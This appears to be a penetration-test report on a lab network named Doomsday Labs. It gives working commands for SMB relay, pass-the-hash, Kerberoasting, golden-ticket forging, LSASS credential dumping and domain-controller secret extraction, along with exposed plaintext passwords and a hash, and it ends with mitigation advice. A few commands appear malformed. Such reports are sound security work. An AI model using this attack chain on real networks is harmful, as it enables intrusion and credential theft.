# Comprehensive Penetration Testing Report for Doomsday Labs

## Executive Summary
This document details the penetration testing activities undertaken against Doomsday Labs' network, specifically scoped within the IP range 10.100.1.2 to 10.100.1.7. The objective was to identify vulnerabilities and to assess the potential impacts on the network's security posture. The testing involved several methodologies including OSINT, SMB Relay attacks, Credential Dumping, and Active Directory Exploitation.

## Test Environment
- **Scope**: Targeted IP addresses from 10.100.1.2 to 10.100.1.7.
- **Tools Used**: Nmap, Crackmapexec, Responder, Hashcat, Impacket, Bloodhound, Neo4j, pypykatz, Evil-WinRM

## Key Exploits and Findings

### SMB Relay and Credential Harvesting
- **Target File**: `targets.txt` (contains the scope of testing IP addresses)
- **Method**: Utilized Crackmapexec and Impacket's ntlmrelayx for SMB Relay attacks to capture and relay NTLM hashes.
    ```
    crackmapexec smb 10.100.1.2-7 --gen-relay-list targets.txt -socks
    impacket-ntlmrelayx -smb2support -tf targets.txt
    ```
- **Outcome**: Successfully captured NTLM hashes and relayed them to gain unauthorized access to network systems, this allowed us to gain our initial credentials for further testing.

### Credential Dumping
- **Tools**: Evil-WinRM, pypykatz
- **Example Command**:
    ```
    evil-winrm -i 10.100.1.4 -u info -H 322e0b51ca281c55:F1F9E4FF7872D084AC0E2CB11DE7D2C0
    ```
- **Results**: Accessed hosts using dumped NTLM hashes and manually dumped credentials using pypykatz on compromised systems.
- Plaintext Password: Football24

### Active Directory and Kerberos Attacks
- **Enumeration**:
    ```
    impacket-GetADUsers doomsdaylabs.net/filemaker:Football24 -dc-ip 10.100.1.2 -all
    ```
- **Kerberoasting**:
    ```
    impacket-GetUserSPNs doomsdaylabs.net/filemaker -dc-ip 10.100.1.2 -request
    ```
    Attempted to crack Kerberos tickets using Hashcat.
- **Pass the Ticket & Golden Ticket Creation**:
    ```
    impacket-ticketer -nthash     doIF0jCCBc6gAwIBBaEDAgEWooIEyz...[snipped]...NXU/rX266m632YeSk3csEUpoKMTPZ -domain-sid S-1-5-21-2774200336-3400690103-1452933870-1111 -domain doomsdaylabs.net da.admin
    KRB5CCNAME=./Administrator.ccache impacket-secretsdump -k -no-pass -dc-ip 10.100.1.2 -target-ip 10.100.1.2 dc.doomsdaylabs.net
    ```
- Plaintext password: Sunshine24

### Bloodhound Analysis for Lateral Movement
- **Objective**: Utilize Bloodhound to identify and exploit lateral movement pathways within the network.
- **Process**:
    - Repeated use of Bloodhound to map out different phases of lateral movement as administrative privileges were escalated throughout the network.

## Lateral Movement Pathways
Detailed steps of movement from initial access on a file share to domain privilege escalation:
- **Initial Access**:
    - Placed a malicious LNK file on an SMB Share to capture FileMaker's NetNTLM hash.
    - Credentials obtained were used to access a workstation (first lateral movement).
- **Subsequent Movements**:
    - Leveraged administrative privileges on different machines, used credentials for Kerberoasting, and eventually gained access to the domain controller.

## Recommendations
- **SMB Relay Attack Mitigation**: Implement SMB signing and enforce strict authentication checks to mitigate relay attacks.
- **Credential Security**: Enhance monitoring of credential usage and implement multi-factor authentication where possible.
- **Active Directory Security**: Regularly update and patch Active Directory environments. Use advanced monitoring tools like Bloodhound to detect unusual patterns of movement or privilege escalation.

## Conclusion
The penetration test revealed several critical vulnerabilities in Doomsday Labs' network that could potentially be exploited by malicious actors to gain unauthorized access and control over network resources. It is recommended that the findings and recommendations detailed in this report be addressed promptly to improve the security posture of the organization.

## Appendix
- **Tools and Commands**:
    - `crackmapexec smb 10.100.1.2-7 --gen-relay-list targets.txt`
    - `impacket-ntlmrelayx -smb2support -tf targets.txt`
    - `evil-winrm -i 10.100.1.4 -u filemaker -H NThash`
    - `pypykatz lsa minidump lsass.dmp`

## References
- [Hashcat Rule-based Attack Guide](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
- [CrackMapExec Kali Tool](https://www.kali.org/tools/crackmapexec/)
- [Using Hashcat for Rule-based Attacks](https://www.armourinfosec.com/performing-rule-based-attack-using-hashcat/)
